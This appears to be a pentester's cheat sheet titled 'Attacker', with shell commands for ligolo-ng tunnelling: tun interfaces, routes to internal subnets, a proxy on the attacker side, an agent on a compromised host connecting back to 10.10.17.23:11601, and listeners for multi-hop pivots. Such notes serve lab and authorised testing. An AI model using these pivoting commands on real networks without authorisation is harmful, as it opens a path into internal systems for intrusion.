# Attacker


## setup network
```shell
# enter root mode
sudo su

# create interface
ip tuntap add user root mode tun ligolo
ip link set ligolo up

# every pivot need a new interface
ip tuntap add user root mode tun ligolo2
ip link set ligolo2 up


# create network to be routed on the interface created
ip route add 172.16.1.0/24 dev ligolo

# create ip to be routed
sudo ip route add 172.16.2.101 dev ligolo2

```

## ligolo proxy
```
# ligolo port is 11601 by default 
# from attacker : start proxy
./proxy -selfcert 

# from c2 : connect to your machine
./agent -connect 10.10.17.23:11601  -ignore-cert

# from attacker: select agent and start tunneling on a interface created
session 1
start --tun ligolo


# for pivot more than 1 hop you can select a session then listen on it 
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
listener_list

```


## ligolo agent reverse connect

[Bind](https://github.com/nicocha30/ligolo-ng/wiki/Bind)
